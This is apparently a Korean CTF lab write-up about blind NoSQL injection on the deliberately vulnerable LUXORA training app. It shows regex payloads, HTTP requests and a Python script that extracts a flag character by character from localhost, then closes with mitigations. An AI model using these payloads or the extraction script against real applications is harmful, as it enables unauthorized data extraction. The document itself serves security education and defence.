+++
title = "VulnABLE CTF [LUXORA]: NoSQL Injection 🥈 Silver (Blind Data Extraction)"
description = "LUXORA 플랫폼의 NoSQL Blind Injection 플래그 획득 시나리오 및 정규표현식(Regex)을 이용한 데이터 추출 기법"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Silver", "Blind", "Regex"]
+++

# VulnABLE CTF [LUXORA]: NoSQL Injection 🥈 Silver

Bronze 단계에서는 입력값이 객체(Object)인지 검사하지 않는 취약점을 이용해 간단히 `$ne` 연산자로 인증을 우회했습니다. 하지만 Silver 난이도인 `/nosqli/silver` 라우트에서는 개발자가 입력 타입을 엄격히 검사하고 객체를 차단했습니다.

그러나 NoSQL 환경에서는 또 다른 무기가 있습니다. 바로 **정규표현식(Regex)을 이용한 Blind Injection**입니다.

---

## 🕒 1. 타겟 탐색 및 방어 로직 확인 (Reconnaissance)

`/nosqli/silver` 페이지는 사용자의 비밀번호 재설정 시, 패스워드 힌트를 알려주는 기능입니다. 이메일(Email) 파라미터만 입력받습니다.

* `POST /nosqli/silver` (data: `email=admin@luxora.test`) 
  ➔ 응답: `{"success": true, "hint": "Your pet's name"}`
* `POST /nosqli/silver` (data: `email={"$ne": "1"}`) 
  ➔ 응답: `{"error": "Invalid email format"}` (객체 주입 방어 확인됨)

**[해커의 사고 과정]**
* 입력 타입은 오직 문자열(String)만 허용된다. 객체(`{}`)를 쓸 수 없다.
* 하지만 많은 NoSQL 클라이언트(예: 구형 PHP 드라이버나 특정 설정의 Node.js 환경)는 쿼리 파라미터 내에서 **정규표현식 문자열**을 그대로 해석하는 버그가 존재한다.
* 정규표현식을 이용해 "A로 시작하는 이메일이 있니?", "B로 시작하는 이메일이 있니?"라고 스무고개를 던져보자!

---

## 🕒 2. 취약점 식별 및 정규표현식 페이로드 설계 (Exploitation)

데이터베이스 쿼리가 정규식을 허용하는지 확인하기 위해, 정규표현식 앵커(Anchor)인 `^` (시작) 문자를 사용해봅니다.

### 💡 공격 원리: 정규표현식(Regex) 평가 악용
우리는 `admin@luxora.test`가 존재한다는 것을 압니다.

* 페이로드 1: `email=^a.*` (a로 시작하는 아무 이메일)
  ➔ 응답: `{"success": true, "hint": "Your pet's name"}`
* 페이로드 2: `email=^b.*` (b로 시작하는 아무 이메일)
  ➔ 응답: `{"error": "User not found"}`

**빙고!** 서버가 문자열로 들어온 정규표현식을 그대로 MongoDB 쿼리로 돌리고 있습니다!
이메일은 이미 알고 있으니, 우리가 모르는 **다른 필드(예: 비밀번호 리셋 토큰이나 플래그)**를 유추해 볼 수 있습니다. 만약 백엔드가 쿼리 파라미터를 통째로 몽고DB 쿼리에 매핑한다면, 우리가 임의의 필드를 추가할 수 있습니다.

---

## 🕒 3. Blind 추출 수행 및 자동화 스크립트 작성

URL 파라미터에 `email` 대신 `flag` 필드를 임의로 넣고 정규식 공격을 시도합니다.

```http
# 플래그가 F로 시작하는가?
POST /nosqli/silver
Content-Type: application/x-www-form-urlencoded

flag=^F.*
```
➔ 응답: `{"success": true}` (존재함!)

이제 파이썬(Python)으로 자동화 스크립트를 짜서 한 글자씩 추출합니다.

```python
import requests
import string

url = "http://localhost:3000/nosqli/silver"
chars = string.ascii_letters + string.digits + "{}_"
flag = "^"

print("Extracting flag...")
while True:
    for c in chars:
        payload = {"flag": flag + c + ".*"}
        res = requests.post(url, data=payload)
        
        if "success" in res.text:
            flag += c
            print(f"Found: {flag.replace('^', '')}")
            break
    
    if flag.endswith("}"):
        break

print(f"Final Flag: {flag.replace('^', '')}")
```

### 🔍 스크립트 구동 결과
파이썬 스크립트가 1초에 수십 번씩 요청을 보내며 글자를 맞춰갑니다.
```text
Extracting flag...
Found: F
Found: FL
Found: FLA
...
Found: FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}
Final Flag: FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}`

### 📝 왜 이런 공격이 성공했는가?
개발자가 객체(Object) 주입은 막았지만, URL Query String이나 x-www-form-urlencoded 데이터가 백엔드에서 파싱될 때, MongoDB가 문자열을 정규표현식(`$regex`)으로 자동 변환해버리는 프레임워크/라이브러리의 기본 설정을 간과했기 때문입니다.

### 🛡️ 방어 대책 (Mitigation)
1. **입력값 이스케이핑 (Escaping)**: 사용자가 입력한 문자열을 정규표현식 검색에 사용할 때는 `^`, `$`, `*`, `.` 같은 특수문자를 반드시 이스케이프 처리하여, 순수한 문자로만 검색되게 해야 합니다.
2. **필드 제한 강제**: 데이터베이스 쿼리를 던질 때, 클라이언트에서 올라온 키(Key) 값을 그대로 쓰면 안 됩니다.
   - ❌ 잘못된 예: `db.users.findOne(req.body)` -> 사용자가 `flag` 키를 맘대로 넣을 수 있음.
   - ✅ 올바른 예: `db.users.findOne({ email: req.body.email })` -> 오직 email만 검색하도록 강제.

다음은 NoSQL의 고차원 공격, **Gold 🥇 난이도 (SSJS Injection)**를 다루겠습니다!